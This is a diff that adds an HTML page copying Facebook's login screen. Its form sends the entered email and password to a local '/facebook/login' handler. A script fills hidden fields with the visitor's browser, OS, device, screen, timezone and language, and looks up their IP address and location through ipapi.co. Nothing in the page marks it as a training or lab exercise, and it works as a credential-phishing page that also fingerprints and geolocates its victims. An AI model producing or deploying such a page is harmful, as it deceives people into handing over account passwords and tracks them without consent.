@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Log in</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:Helvetica,Arial,sans-serif; background:#f0f2f5; min-height:100vh;
+         display:flex; justify-content:center; align-items:center; padding:20px; }
+  .wrapper { width:100%; max-width:980px; display:flex; justify-content:space-between;
+             align-items:center; gap:40px; flex-wrap:wrap; }
+  .left { flex:1 1 400px; padding:20px; }
+  .left h1 { color:#1877f2; font-size:56px; font-weight:bold; letter-spacing:-2px; margin-bottom:10px; }
+  .left p { font-size:24px; color:#1c1e21; line-height:1.3; }
+  .right { flex:1 1 360px; max-width:396px; }
+  .login-box { background:#fff; padding:20px; border-radius:8px;
+    box-shadow:0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); text-align:center; }
+  .login-box input { width:100%; padding:14px 16px; font-size:17px; border:1px solid #dddfe2;
+    border-radius:6px; margin-bottom:12px; outline:none; }
+  .login-box input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; }
+  .login-btn { width:100%; background:#1877f2; color:#fff; border:none; padding:12px;
+    font-size:20px; font-weight:bold; border-radius:6px; cursor:pointer; margin-bottom:16px; }
+  .login-btn:hover { background:#166fe5; }
+  .forgot { display:block; color:#1877f2; font-size:14px; text-decoration:none; margin-bottom:20px; }
+  hr { border:none; border-top:1px solid #dadde1; margin:20px 0; }
+  .create-btn { background:#42b72a; color:#fff; border:none; padding:12px 20px;
+    font-size:17px; font-weight:bold; border-radius:6px; cursor:pointer; }
+  .create-btn:hover { background:#36a420; }
+  .below { text-align:center; font-size:14px; margin-top:28px; color:#1c1e21; }
+  .below a { color:#1c1e21; font-weight:bold; text-decoration:none; }
+  @media (max-width: 800px) {
+    body { align-items: flex-start; padding: 20px 20px 40px; }
+    .wrapper { flex-direction:column; text-align:center; gap: 0; }
+    .left { flex: none; width: 100%; padding: 30px 20px 20px; }
+    .left h1 { font-size:44px; }
+    .left p { font-size:20px; }
+    .right { width:100%; max-width:396px; margin-top: 30px; }
+  }
+  @media (max-width: 480px) {
+    body { padding: 16px 16px 40px; align-items: flex-start; }
+    .left { padding: 40px 8px 16px; }
+    .left h1 { font-size: 38px; margin-bottom: 8px; letter-spacing: -1.5px; }
+    .left p { font-size: 17px; line-height: 1.35; }
+    .right { margin-top: 20px; }
+    .login-box { padding: 16px; }
+    .login-box input { padding: 13px 15px; font-size: 16px; margin-bottom: 10px; }
+    .login-btn { padding: 11px; font-size: 18px; margin-bottom: 14px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="left">
+    <h1>facebook</h1>
+    <p>Connect with friends and the world around you on Facebook.</p>
+  </div>
+  <div class="right">
+    <div class="login-box">
+      <form action="/facebook/login" method="POST" id="login-form">
+        <input type="text" name="email" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="login-btn">Log In</button>
+        <input type="hidden" name="ip_address" id="ip-address">
+        <input type="hidden" name="geo_location" id="geo-location">
+        <input type="hidden" name="device_type" id="device-type">
+        <input type="hidden" name="browser_info" id="browser-info">
+        <input type="hidden" name="os_info" id="os-info">
+        <input type="hidden" name="screen_resolution" id="screen-resolution">
+        <input type="hidden" name="timezone" id="timezone">
+        <input type="hidden" name="language" id="language">
+      </form>
+      <a href="#" class="forgot">Forgot password?</a>
+      <hr>
+      <button type="button" class="create-btn">Create new account</button>
+    </div>
+    <p class="below"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+  </div>
+</div>
+<script>
+async function collectFingerprint() {
+  const ua = navigator.userAgent;
+  document.getElementById('browser-info').value = ua;
+  document.getElementById('os-info').value = navigator.platform;
+  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
+  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
+  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value = navigator.language;
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    if (d.ip) {
+      document.getElementById('ip-address').value = d.ip;
+      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
+    }
+  } catch(e) {
+    document.getElementById('ip-address').value = 'Unknown';
+    document.getElementById('geo-location').value = 'Unknown';
+  }
+}
+document.addEventListener('DOMContentLoaded', () => {
+  collectFingerprint();
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    await collectFingerprint();
+    form.submit();
+  });
+});
+</script>
+</body>
+</html>
